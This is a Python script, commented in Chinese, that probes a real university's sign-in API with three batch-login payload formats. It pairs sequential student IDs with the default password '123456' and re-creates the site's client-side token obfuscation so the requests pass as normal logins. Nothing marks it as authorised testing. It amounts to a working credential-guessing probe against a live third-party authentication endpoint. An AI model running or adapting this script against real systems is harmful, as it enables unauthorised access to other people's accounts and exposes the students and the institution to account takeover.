# -*- coding: utf-8 -*-
"""
batch_login_probe.py   （2025-07-13）

尝试 3 种批量 payload：
  A) {"c": [token1, token2]}
  B) {"users": [{"uid":..., "pwd":...}, ...]}
  C) {"batch": [{"c": token1}, {"c": token2}]}

在控制台打印每种格式的状态码与响应体前 200 字。
"""

import asyncio, aiohttp, base64, urllib.parse, time, json

TARGET_URL = "https://view.shufe.edu.cn/api/v1/user/sign-in"

# ------- 测试账号列表 -------
ACCOUNTS = [
    ("2015000031", "123456"),
    ("2015000032", "123456")
]

# ------- 与原接口一致的 mixToken -------
def mixToken(token, encrypt_token=True):
    ts   = str(int(time.time() * 1000))
    enc  = urllib.parse.quote(token) + '_' + ts
    rev  = enc[::-1]
    fin  = base64.b64encode(rev.encode()).decode()
    return (base64.b64encode((fin + '_' + ts).encode()).decode())[::-1]

# ------- 构造 3 种候选 payload -------
def make_payloads():
    tokens = [mixToken(f"{uid}:{pwd}") for uid, pwd in ACCOUNTS]

    payload_a = {"c": tokens}   # 列表直接塞进原字段
    payload_b = {"users": [{"uid": u, "pwd": p} for u, p in ACCOUNTS]}
    payload_c = {"batch": [{"c": t} for t in tokens]}

    return [
        ("A  c:[token…]", payload_a),
        ("B  users:[{uid,pwd}]", payload_b),
        ("C  batch:[{c:token}]", payload_c),
    ]

async def probe_format(session, label, payload):
    print(f"\n=== 发送格式 {label} ===")
    async with session.post(TARGET_URL, json=payload) as resp:
        text = await resp.text()
        print(f"Status: {resp.status}")
        print("Body  :\n", text[:200].replace("\n", "\\n"))

async def main():
    timeout = aiohttp.ClientTimeout(total=15)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        tasks = [probe_format(session, lbl, body) for lbl, body in make_payloads()]
        await asyncio.gather(*tasks)

if __name__ == "__main__":
    asyncio.run(main())
